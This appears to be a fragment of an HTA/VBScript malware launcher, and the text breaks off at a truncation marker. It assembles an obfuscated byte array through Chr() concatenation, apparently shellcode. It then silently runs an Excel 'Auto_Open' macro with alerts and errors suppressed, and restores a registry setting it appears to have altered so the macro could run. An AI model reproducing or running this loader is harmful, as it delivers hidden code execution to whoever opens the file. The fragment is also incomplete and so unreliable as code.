Chr(45)&"123"&Chr(44)&Chr(45)&"64"&Chr(44)&"116"&Chr(44)&"74"&Chr(44)&"1"&Chr(44)&Chr(45)&"48"&Chr(44)&"80"&Chr(44)&Chr(45)&"117"&Chr(44)&"72"&Chr(44)&"24"&Chr(44)&Chr(45)&"117"&Chr(44)&"88"&Chr(44)&"32"& _
Chr(44)&"1"&Chr(44)&Chr(45)&"45"&Chr(44)&Chr(45)&"29"&Chr(44)&"60"&Chr(44)&"73"&Chr(44)&Chr(45)&"117"&Chr(44)&"52"&Chr(44)&Chr(45)&"117"&Chr(44)&"1"&Chr(44)&" _"&Chr(10)&Chr(45)&"42"&Chr(44)&"49"&Chr(44)& _
Chr(45)&"1"&Chr(44)&"49"&Chr(44)&Chr(45)&"64"&Chr(44)&Chr(45)&"84"[Truncated]...
objExcel.DisplayAlerts = False
on error resume next
objExcel.Run "Auto_Open"
objWorkbook.Close False
objExcel.Quit

' Restore the registry to its old state
if action = "" then
	WshShell.RegDelete RegPath
else
	WshShell.RegWrite RegPath, action, "REG_DWORD"
end if
self.close

```





